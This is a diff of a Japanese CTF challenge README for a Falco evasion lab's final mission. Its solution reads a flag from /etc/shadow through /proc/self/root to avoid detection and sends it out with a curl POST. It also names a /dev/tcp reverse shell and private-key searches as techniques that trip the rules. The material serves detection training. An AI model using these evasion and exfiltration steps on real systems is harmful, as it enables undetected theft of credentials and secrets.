@@ -1,67 +1,64 @@
 # 10 — The Final Exfil (Boss)
 
-集大成。master key は **3 つの断片** に分割され、3 つの異なる sensitive
-file に隠されている。**7 つの禁止ルールを 30 秒の window 内で 1 つも
-発火させずに** 3 断片を回収・連結して提出する。単一ファイルの盗み読み
-(= Mission 03 単体) では flag は完成しない。
+集大成。master key を **発火させずに読み**、**箱の外の collector へ静かに
+持ち出し (exfil)**、**submit** する。3 つすべてを満たして solve。単に読んで
+submit するだけでは通らない(`requireExfil`)。
 
-## Forbidden rules (7)
+## 採点条件 (3 つすべて)
 
-`falco-rule.yaml` の `forbiddenRules` と一致:
+1. `submit` の flag が `expectedFlag` と一致
+2. 直前 `windowSeconds`(30s)に `forbiddenRules`(7 つ)が 1 つも発火していない
+3. その user が collector に正しい flag を exfil 済み
+   (`POST /api/challenges/10-final-exfil/exfil`、`requireExfil: true`)
 
-- Contact K8S API Server From Container
-- Read sensitive file untrusted
-- Search Private Keys or Passwords
-- Run shell untrusted
-- Drop and execute new binary in container
-- Redirect STDOUT/STDIN to Network Connection in Container
-- Create Hardlink Over Sensitive Files
+## なぜ 4-9 の知識が要るか(設計意図)
 
-## Flag (3 断片)
+旧版は「sensitive file を読む」だけで完結し、`/proc/self/root`(Mission 03)
+一発で解けた。本版は **exfil(持ち出し)を必須アクション**にすることで、
+trigger 系ミッションの知識を「やってはいけないこと」として要求する:
 
-postStart (`plant.sh`) が `CTF_FLAG_10_FINAL_EXFIL` の中身 (`FALCO{...}`
-の内側) を 3 等分し、各断片を行頭 `# CTF_FRAGMENT_N:` として配置する:
-
-| 断片 | 配置先ファイル | 検知ルール |
+| 必須アクション | 素朴なやり方(発火) | 回避(学んだ知識) |
 |---|---|---|
-| 1 | `/etc/shadow` | Read sensitive file untrusted |
-| 2 | `/etc/sudoers` | Read sensitive file untrusted |
-| 3 | `/root/.ssh/authorized_keys` | Read sensitive file untrusted |
+| flag を読む | `cat /etc/shadow` → Read-sensitive | `/proc/self/root`(**03**) |
+| 箱の外へ送る | `bash -i >& /dev/tcp/...` → C2(**08**) | curl で HTTP POST |
+| 送信ツール用意 | 自前 exfil バイナリを drop+実行 → Drop+exec(**07**) | 既存の curl を使う |
+| 鍵を漁る/退避 | `find -name id_rsa`/`grep 'PRIVATE KEY'`/`ln` → Search(**04/05**)/Hardlink(**09**) | やらない |
 
-flag = `FALCO{...}`(内側に断片 1→2→3 を連結)。3 つすべて + 正しい順序が必要。
-実値はイベント毎に注入 (`CTF_FLAG_10_FINAL_EXFIL`)、ローカルは dev default
-`FALCO{dev-final-exfil}` → 断片 `dev-f` / `inal-` / `exfil`。
+collector は **HTTP のみ受信**するので、reverse shell では物理的に届かない。
+= 静かな HTTP 持ち出し(curl)が唯一の現実解。
+
+## Flag
+
+postStart (`plant.sh`) が `/etc/shadow` 末尾に `# CTF_MASTER_KEY: FALCO{...}`
+を追記。実値はイベント毎に注入 (`CTF_FLAG_10_FINAL_EXFIL`)、ローカルは
+dev default `FALCO{dev-final-exfil}`。
 
 ## 想定解
 
 ```bash
-# 1. 3 ファイルを /proc/self/root 経由で静かに読む (Mission 03 を 3 回)
-#    - 直接 cat すると Read sensitive file untrusted が即発火
-#    - hardlink で /tmp に逃がす手 (Mission 09) は forbidden に含まれ封鎖
-for f in etc/shadow etc/sudoers root/.ssh/authorized_keys; do
-  cat /proc/self/root/$f
-done | grep CTF_FRAGMENT
-#  → CTF_FRAGMENT_1: dev-f / _2: inal- / _3: exfil
+# 1) 発火させずに読む (Mission 03)
+FLAG=$(grep CTF_MASTER_KEY /proc/self/root/etc/shadow | awk '{print $NF}')
 
-# 2. 順に連結して FALCO{...} で囲む
-#    FALCO{dev-f + inal- + exfil} = FALCO{dev-final-exfil}
+# 2) 既存 curl で collector へ静かに HTTP exfil
+curl -s "${FALCO_CTF_SCOREBOARD}/api/challenges/10-final-exfil/exfil" \
+  -H 'Content-Type: application/json' \
+  -d "{\"user\":\"${FALCO_CTF_USER}\",\"flag\":\"${FLAG}\"}"
+#  → {"received":true,...}
 
-# 3. 30 秒静かに待ってから提出 (過去の rule fire を window から抜く)
+# 3) 30 秒静かに待ってから提出
 source /opt/ctf/submit.sh
-submit 10-final-exfil 'FALCO{dev-final-exfil}'
+submit 10-final-exfil "${FLAG}"
 ```
-
-**注意**: window=30s 中に他のチャレンジで発火させた古い rule fire が
-残っている可能性。参加者には「全断片を回収 → 30 秒静かに → submit」を勧める。
 
 ## 解説
 
-- **単一トリックでは解けない設計**: Mission 03 の `/proc/self/root` 読みを
-  3 ファイルに適用し、断片を組み立てる「運用」が要る。03 を 1 回やるだけ
-  では flag が揃わない。
-- ショートカット封じ: hardlink (Mission 09) を forbidden に含めることで、
-  「sensitive file を /tmp に複製してから読む」近道を塞いでいる。
-- 入力リダイレクト (Mission 05) は cmdline は隠せるが open path は `/etc`
-  のままなので Read ルールには効かない — 必ず path aliasing (`/proc/self/root`)。
-- 講評のポイント: 「単一ルール回避は容易、複合制約 + 複数ターゲットは重い」
-  = 防御側は検知点を増やし機密を分散するほど攻撃者の負担が積み上がる。
+- **exfil を必須化したのが肝**: 「読むだけ」では 03 一本に collapse する
+  (`/proc/self/root` で全 sensitive file が読め、benign マーカーの grep は
+  どのルールも踏まない)。持ち出しという *必須アクション* を足すことで、
+  「派手な持ち出し = 発火」という 07/08 の教訓が初めて要求される。
+- collector が HTTP 受信専用なのは意図的: reverse shell では届かないので、
+  curl(既存バイナリ・dup を伴わない HTTP)に自然に誘導される。
+- window 検査は二重の安全網: もし reverse shell や drop+exec を試して
+  発火させると、その後 30 秒は submit が `evaded:false` で弾かれる。
+- 講評: 防御側は「検知点を増やす」だけでなく「攻撃者が必ず通る隘路
+  (= 持ち出し)」に検知を置くほど、攻撃コストが跳ね上がる。
